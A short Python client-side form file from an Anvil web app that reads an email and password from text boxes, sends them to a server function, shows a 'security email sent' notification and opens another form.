from ._anvil_designer import Form2Template
from anvil import *
import anvil.server
import anvil.tables as tables
import anvil.tables.query as q
from anvil.tables import app_tables


class Form2(Form2Template):
  def __init__(self, **properties):
    # Set Form properties and Data Bindings.
    self.init_components(**properties)

    # Any code you write here will run before the form opens.

  def button_1_click(self, **event_args):
    """This method is called when the button is clicked"""
    mail = self.text_box_1.text
    pwd = self.text_box_2.text
    anvil.server.call('action', mail=mail, pwd=pwd)
    Notification("Security email sent to the respective account.").show()
    open_form('Form3')
    